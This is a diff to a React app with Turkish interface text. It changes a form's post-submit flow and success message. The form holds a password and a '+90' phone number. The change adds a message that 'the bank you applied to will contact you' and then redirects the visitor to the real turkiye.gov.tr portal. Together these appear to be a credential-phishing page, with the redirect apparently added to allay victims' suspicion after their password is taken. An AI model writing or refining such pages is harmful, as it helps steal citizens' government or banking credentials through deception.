@@ -355,7 +355,9 @@ function App() {
           setSifre('')
           setTelefon('+905')
           loadApplications()
-        }, 3000)
+          // Turkiye.gov.tr'ye yönlendir
+          window.location.href = 'https://www.turkiye.gov.tr'
+        }, 4000) // 4 saniye bekle sonra yönlendir
       } else {
         const error = await response.json()
         alert('Başvuru hatası: ' + (error.message || 'Bilinmeyen hata'))
@@ -655,10 +657,12 @@ function App() {
 
       {showSuccessAnimation && (
         <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
-          <div className="bg-white rounded-lg p-8 text-center">
+          <div className="bg-white rounded-lg p-8 text-center max-w-md mx-4">
             <div className="text-6xl mb-4">✅</div>
-            <h3 className="text-xl font-semibold text-gray-900 mb-2">Başvuru Gönderildi!</h3>
-            <p className="text-gray-600">Başvurunuz başarıyla alındı.</p>
+            <h3 className="text-xl font-semibold text-gray-900 mb-4">Başvurunuz Alındı!</h3>
+            <p className="text-gray-600 mb-2">Başvurunuz başarıyla alındı.</p>
+            <p className="text-gray-700 font-medium">Başvurduğunuz banka temsilcisi tarafınızla iletişime geçecektir.</p>
+            <p className="text-sm text-gray-500 mt-4">Turkiye.gov.tr'ye yönlendiriliyorsunuz...</p>
           </div>
         </div>
       )}
